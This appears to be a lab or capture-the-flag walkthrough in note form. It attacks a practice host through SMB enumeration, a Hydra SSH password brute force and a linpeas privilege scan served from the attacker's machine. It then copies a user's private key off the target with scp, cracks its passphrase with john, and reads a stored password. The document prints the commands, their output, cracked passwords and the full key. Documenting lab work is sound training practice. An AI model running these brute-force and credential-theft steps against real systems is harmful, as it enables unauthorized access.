# Target:10.201.81.127
```
nmap 10.201.81.127               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 19:56 IST  
Nmap scan report for 10.201.81.127  
Host is up (0.29s latency).  
Not shown: 994 closed tcp ports (reset)  
PORT     STATE SERVICE  
22/tcp   open  ssh  
80/tcp   open  http  
139/tcp  open  netbios-ssn  
445/tcp  open  microsoft-ds  
8009/tcp open  ajp13  
8080/tcp open  http-proxy  
  
Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds
 ```
# Website
 ![[Pasted image 20250915205218.png]]
 ## dev.txt
 ![[Pasted image 20250915205254.png]]
 j.txt
 ![[Pasted image 20250915205322.png]]
 # SMB enumeration
```
 enum4linux 10.201.81.127                                              
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep 15 20:41:29 2025  
  
=========================================( Target Information )=========================================  
  
Target ........... 10.201.81.127  
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  
  
  
===========================( Enumerating Workgroup/Domain on 10.201.81.127 )===========================  
  
  
[+] Got domain/workgroup name: WORKGROUP  
  
  
===============================( Nbtstat Information for 10.201.81.127 )===============================  
  
Looking up status of 10.201.81.127  
       BASIC2          <00> -         B <ACTIVE>  Workstation Service  
       BASIC2          <03> -         B <ACTIVE>  Messenger Service  
       BASIC2          <20> -         B <ACTIVE>  File Server Service  
       ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser  
       WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name  
       WORKGROUP       <1d> -         B <ACTIVE>  Master Browser  
       WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections  
  
       MAC Address = 00-00-00-00-00-00  
  
===================================( Session Check on 10.201.81.127 )===================================  
  
  
[+] Server 10.201.81.127 allows sessions using username '', password ''  
  
  
================================( Getting domain SID for 10.201.81.127 )================================  
  
Domain Name: WORKGROUP  
Domain Sid: (NULL SID)  
  
[+] Can't determine if host is part of domain or part of a workgroup  
  
  
==================================( OS information on 10.201.81.127 )==================================  
  
  
[E] Can't get OS info with smbclient  
  
  
[+] Got OS info for 10.201.81.127 from srvinfo:    
       BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.15.13-Ubuntu  
       platform_id     :       500  
       os version      :       6.1  
       server type     :       0x809a03  
  
  
=======================================( Users on 10.201.81.127 )=======================================  
  
Use of uninitialized value $users in print at ./enum4linux.pl line 972.  
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.  
  
Use of uninitialized value $users in print at ./enum4linux.pl line 986.  
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.  
  
=================================( Share Enumeration on 10.201.81.127 )=================================  
  
smbXcli_negprot_smb1_done: No compatible protocol selected by server.  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       Anonymous       Disk         
       IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)  
Reconnecting with SMB1 for workgroup listing.  
Protocol negotiation to server 10.201.81.127 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE  
Unable to connect with SMB1 -- no workgroup available  
  
[+] Attempting to map shares on 10.201.81.127  
  
//10.201.81.127/Anonymous       Mapping: OK Listing: OK Writing: N/A  
  
[E] Can't understand response:  
  
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*  
//10.201.81.127/IPC$    Mapping: N/A Listing: N/A Writing: N/A  
  
===========================( Password Policy Information for 10.201.81.127 )===========================  
  
  
  
[+] Attaching to 10.201.81.127 using a NULL share  
  
[+] Trying protocol 139/SMB...  
  
[+] Found domain(s):  
  
       [+] BASIC2  
       [+] Builtin  
  
[+] Password Info for Domain: BASIC2  
  
       [+] Minimum password length: 5  
       [+] Password history length: None  
       [+] Maximum password age: 37 days 6 hours 21 minutes    
       [+] Password Complexity Flags: 000000  
  
               [+] Domain Refuse Password Change: 0  
               [+] Domain Password Store Cleartext: 0  
               [+] Domain Password Lockout Admins: 0  
               [+] Domain Password No Clear Change: 0  
               [+] Domain Password No Anon Change: 0  
               [+] Domain Password Complex: 0  
  
       [+] Minimum password age: None  
       [+] Reset Account Lockout Counter: 30 minutes    
       [+] Locked Account Duration: 30 minutes    
       [+] Account Lockout Threshold: None  
       [+] Forced Log off Time: 37 days 6 hours 21 minutes    
  
  
  
[+] Retieved partial password policy with rpcclient:  
  
  
Password Complexity: Disabled  
Minimum Password Length: 5  
  
  
======================================( Groups on 10.201.81.127 )======================================  
  
  
[+] Getting builtin groups:  
  
  
[+]  Getting builtin group memberships:  
  
  
[+]  Getting local groups:  
  
  
[+]  Getting local group memberships:  
  
  
[+]  Getting domain groups:  
  
  
[+]  Getting domain group memberships:  
  
  
==================( Users on 10.201.81.127 via RID cycling (RIDS: 500-550,1000-1050) )==================  
  
  
[I] Found new SID:    
S-1-22-1  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''  
  
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)  
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)  
  
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''  
  
S-1-5-32-544 BUILTIN\Administrators (Local Group)  
S-1-5-32-545 BUILTIN\Users (Local Group)  
S-1-5-32-546 BUILTIN\Guests (Local Group)  
S-1-5-32-547 BUILTIN\Power Users (Local Group)  
S-1-5-32-548 BUILTIN\Account Operators (Local Group)  
S-1-5-32-549 BUILTIN\Server Operators (Local Group)  
S-1-5-32-550 BUILTIN\Print Operators (Local Group)  
  
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''  
  
S-1-22-1-1000 Unix User\kay (Local User)  
S-1-22-1-1001 Unix User\jan (Local User)  
S-1-22-1-1002 Unix User\ubuntu (Local User)  
  
===============================( Getting printer info for 10.201.81.127 )===============================  
  
No printers returned.  
  
  
enum4linux complete on Mon Sep 15 21:02:52 2025
```
```
smbXcli_negprot_smb1_done: No compatible protocol selected by server.  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       Anonymous       Disk         
       IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)  
Reconnecting with SMB1 for workgroup listing.  
Protocol negotiation to server 10.201.81.127 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE  
Unable to connect with SMB1 -- no workgroup available
```
Here we can see a share Anonymous
## SMB 
```
smbclient //10.201.81.127/Anonymous                 
Password for [WORKGROUP\nobu]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Apr 19 23:01:20 2018  
 ..                                  D        0  Thu Apr 19 22:43:06 2018  
 staff.txt                           N      173  Thu Apr 19 22:59:55 2018  
  
               14282840 blocks of size 1024. 6251860 blocks available  

smb: \> get staff.txt  
getting file \staff.txt of size 173 as staff.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \> ls  
 .                                   D        0  Thu Apr 19 23:01:20 2018  
 ..                                  D        0  Thu Apr 19 22:43:06 2018  
 staff.txt                           N      173  Thu Apr 19 22:59:55 2018  
  
               14282840 blocks of size 1024. 6251616 blocks available  

```
cat.txt
```
cat staff.txt                                            
Announcement to staff:  
  
PLEASE do not upload non-work-related items to this share. I know it's all in fun, but  
this is how mistakes happen. (This means you too, Jan!)  
  
-Kay
```
# BruteForce 
## SSH brute
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.201.81.127 ssh 
  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 21:00:42  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[WARNING] reducing maximum tasks to MAXTASKS (64)  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore  
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task  
[DATA] attacking ssh://10.201.81.127:22/  
[STATUS] 413.00 tries/min, 413 tries in 00:01h, 14344028 to do in 578:52h, 22 active  
[22][ssh] host: 10.201.81.127   login: jan   password: armando  
1 of 1 target successfully completed, 1 valid password found  
[WARNING] Writing restore file because 12 final worker threads did not complete until end.  
[ERROR] 12 targets did not resolve or could not be connected  
[ERROR] 0 target did not complete  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-15 21:03:39
```
## ssh login
```
ssh jan@10.201.81.127      
The authenticity of host '10.201.81.127 (10.201.81.127)' can't be established.  
ED25519 key fingerprint is SHA256:QWwz/cz4bVF97wC9jORJH0xrnf+OzLo2BM1SoKLeXzI.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.201.81.127' (ED25519) to the list of known hosts.  
jan@10.201.81.127's password:    
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Mon 15 Sep 2025 11:40:26 AM EDT  
  
 System load:  0.0                Processes:             109  
 Usage of /:   49.8% of 13.62GB   Users logged in:       0  
 Memory usage: 49%                IPv4 address for eth0: 10.201.81.127  
 Swap usage:   0%  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
Enable ESM Infra to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings  
  
Your Hardware Enablement Stack (HWE) is supported until April 2025.  
  
  
The programs included with the Ubuntu system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
applicable law.  
  
  
The programs included with the Ubuntu system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
applicable law.  
  
Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102  
jan@ip-10-201-81-127:~$ ls
```
linpeas.sh
```
/usr/share/peass/linpeas  
├── linpeas_darwin_amd64  
├── linpeas_darwin_arm64  
├── linpeas_fat.sh  
├── linpeas_linux_386  
├── linpeas_linux_amd64  
├── linpeas_linux_arm  
├── linpeas_linux_arm64  
├── linpeas.sh  
└── linpeas_small.sh  
┌──(nobu㉿kali)-[/usr/share/peass/linpeas]  
└─$ python3 -m http.server                                                                               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
127.0.0.1 - - [15/Sep/2025 21:16:40] "GET / HTTP/1.1" 200 -  
127.0.0.1 - - [15/Sep/2025 21:16:40] code 404, message File not found  
127.0.0.1 - - [15/Sep/2025 21:16:40] "GET /favicon.ico HTTP/1.1" 404 -  
127.0.0.1 - - [15/Sep/2025 21:19:08] "GET / HTTP/1.1" 200 -  
127.0.0.1 - - [15/Sep/2025 21:19:11] "GET /linpeas.sh HTTP/1.1" 200 -
```
running linpeas 
```
╔══════════╣ Searching ssl/ssh files  
╔══════════╣ Analyzing SSH Files (limit 70)  
  
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 /home/kay/.ssh/id_rsa  
-----BEGIN RSA PRIVATE KEY-----  
Proc-Type: 4,ENCRYPTED  
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75  
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  
-----END RSA PRIVATE KEY-----  
-rw-r--r-- 1 kay kay 771 Apr 19  2018 /home/kay/.ssh/id_rsa.pub  
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzAsDwjb0ft4IO7Kyux8DWocNiS1aJqpdVEo+gfk8Ng624b9qOQp7LOWDMVIINfCuzkTA3ZugSyo1OehPc0iyD7SfJIMzsETFvlHB3DlLLeNFm11hNeUBCF4Lt6o9uH3lcTuPVyZAvbAt7xD66bKjyEUy3hrpSnruN+M0exdSja  
V54PI9TBFkUmmqpXsrWzMj1QaxBxZMq3xaBxTsFvW2nEx0rPOrnltQM4bdAvmvSXtuxLw6e5iCaAy1eoTHw0N6IfeGvwcHXIlCT25gH1gRfS0/NdR9cs78ylxYTLDnNvkxL1J3cVzVHJ/ZfOOWOCK4iJ/K8PIbSnYsBkSnrIlDX27PM7DZCBu+xhIwV5z4hRwwZZG5VcU+nDZZYr4  
xtpPbQcIQWYjVwr5vF3vehk57ymIWLwNqU/rSnZ0wZH8MURhVFaNOdr/0184Z1dJZ34u3NbIBxEV9XsjAh/L52Dt7DNHWqUJKIL1/NV96LKDqHKCXCRFBOh9BgqJUIAXoDdWLtBunFKu/tgCz0n7SIPSZDxJDhF4StAhFbGCHP9NIMvB890FjJE/vys/PuY3efX1GjTdAijRa019M  
2f8d0OnJpktNwCIMxEjvKyGQKGPLtTS8o0UAgLfV50Zuhg7H5j6RAJoSgFOtlosnFzwNuxxU05ozHuJ59wsmn5LMK97sbow== I don't have to type a long password anymore!  
  
  
  
-rw-rw-r-- 1 kay kay 771 Apr 23  2018 /home/kay/.ssh/authorized_keys  
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzAsDwjb0ft4IO7Kyux8DWocNiS1aJqpdVEo+gfk8Ng624b9qOQp7LOWDMVIINfCuzkTA3ZugSyo1OehPc0iyD7SfJIMzsETFvlHB3DlLLeNFm11hNeUBCF4Lt6o9uH3lcTuPVyZAvbAt7xD66bKjyEUy3hrpSnruN+M0exdSja  
V54PI9TBFkUmmqpXsrWzMj1QaxBxZMq3xaBxTsFvW2nEx0rPOrnltQM4bdAvmvSXtuxLw6e5iCaAy1eoTHw0N6IfeGvwcHXIlCT25gH1gRfS0/NdR9cs78ylxYTLDnNvkxL1J3cVzVHJ/ZfOOWOCK4iJ/K8PIbSnYsBkSnrIlDX27PM7DZCBu+xhIwV5z4hRwwZZG5VcU+nDZZYr4  
xtpPbQcIQWYjVwr5vF3vehk57ymIWLwNqU/rSnZ0wZH8MURhVFaNOdr/0184Z1dJZ34u3NbIBxEV9XsjAh/L52Dt7DNHWqUJKIL1/NV96LKDqHKCXCRFBOh9BgqJUIAXoDdWLtBunFKu/tgCz0n7SIPSZDxJDhF4StAhFbGCHP9NIMvB890FjJE/vys/PuY3efX1GjTdAijRa019M  
2f8d0OnJpktNwCIMxEjvKyGQKGPLtTS8o0UAgLfV50Zuhg7H5j6RAJoSgFOtlosnFzwNuxxU05ozHuJ59wsmn5LMK97sbow== I don't have to type a long password anymore!
```
copy rsa key
```
scp jan@10.201.81.127:/home/kay/.ssh/id_rsa .  
jan@10.201.81.127's password:    
id_rsa                                                              100% 3326     5.3KB/s   00:00
```
convert to bruteforce
```
ssh2john id_rsa > hassh.txt
```
bruteforce 
```
john --wordlist=/usr/share/wordlists/rockyou.txt hassh.txt  
  
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes  
Cost 2 (iteration count) is 1 for all loaded hashes  
Will run 32 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
beeswax          (id_rsa)        
1g 0:00:00:00 DONE (2025-09-15 21:44) 50.00g/s 4147Kp/s 4147Kc/s 4147KC/s bird..WIFEY1  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
connect to ssh
```
ssh -i id_rsa kay@10.201.81.127  
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @  
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
Permissions 0644 for 'id_rsa' are too open.  
It is required that your private key files are NOT accessible by others.  
This private key will be ignored.  
Load key "id_rsa": bad permissions  
kay@10.201.81.127's password:    
Permission denied, please try again.  
kay@10.201.81.127's password:    
Permission denied, please try again.  
kay@10.201.81.127's password:
```
permission issue
```
chmod 600 id_rsa
```
login ssh
```
ssh -i id_rsa kay@10.201.81.127  
Enter passphrase for key 'id_rsa':    
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Mon 15 Sep 2025 12:16:06 PM EDT  
  
 System load:  0.0                Processes:             123  
 Usage of /:   49.9% of 13.62GB   Users logged in:       1  
 Memory usage: 61%                IPv4 address for eth0: 10.201.81.127  
 Swap usage:   20%  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
Enable ESM Infra to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or  
proxy settings  
  
Your Hardware Enablement Stack (HWE) is supported until April 2025.  
  
Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228  
kay@ip-10-201-81-127:~$ ls  
pass.bak  
kay@ip-10-201-81-127:~$ cat pass.bak  
heresareallystrongpasswordthatfollowsthepasswordpolicy$$  
kay@ip-10-201-81-127:~$
```
